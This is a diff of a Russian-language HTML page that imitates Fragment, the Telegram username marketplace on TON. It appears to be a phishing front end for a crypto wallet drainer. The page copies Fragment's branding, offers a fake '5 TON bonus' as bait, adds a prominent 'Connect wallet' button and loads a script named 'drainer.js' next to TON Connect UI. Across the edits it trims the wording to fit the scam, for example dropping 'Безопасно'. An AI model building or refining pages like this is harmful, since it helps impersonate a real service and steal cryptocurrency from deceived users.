@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Fragment — покупка username и номеров</title>
+    <title>Fragment — покупка username</title>
     <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
-    <!-- Шапка как у Fragment -->
+    <!-- Шапка -->
     <header class="header">
         <div class="container header-inner">
             <div class="logo">
@@ -21,21 +21,20 @@
                 <a href="#">Аккаунты</a>
                 <a href="#">FAQ</a>
             </nav>
-            <div id="ton-connect-container"></div>
+            <!-- ЯВНАЯ КНОПКА ПОДКЛЮЧЕНИЯ -->
+            <button id="connectWalletBtn" class="btn-connect">Подключить кошелёк</button>
         </div>
     </header>
 
-    <!-- Герой-секция -->
+    <!-- Герой -->
     <section class="hero">
         <div class="container">
             <h1>Покупайте и продавайте<br />username Telegram</h1>
-            <p class="hero-sub">
-                Анонимно. Безопасно. На TON blockchain.
-            </p>
+            <p class="hero-sub">Анонимно. На TON blockchain.</p>
         </div>
     </section>
 
-    <!-- Секция с аукционом (имитация) -->
+    <!-- Секция с бонусом -->
     <section class="auction">
         <div class="container">
             <h2>🔥 Горячие лоты</h2>
@@ -60,22 +59,18 @@
                 <button id="claimRewardBtn" class="btn-primary" disabled>
                     🎁 Забрать бонус 5 TON
                 </button>
-                <p class="cta-hint">Подключите кошелёк для получения бонуса</p>
+                <p id="statusHint" class="cta-hint">Подключите кошелёк для получения бонуса</p>
             </div>
         </div>
     </section>
 
-    <!-- Футер -->
     <footer class="footer">
-        <div class="container">
-            <p>© 2026 Fragment. Все права защищены.</p>
-        </div>
+        <div class="container"><p>© 2026 Fragment.</p></div>
     </footer>
 
-    <!-- TON Connect UI -->
+    <!-- Подключаем TON Connect UI -->
     <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.1.0/dist/tonconnect-ui.min.js">
     </script>
-    <!-- Основной скрипт -->
     <script src="drainer.js"></script>
 </body>
 </html>
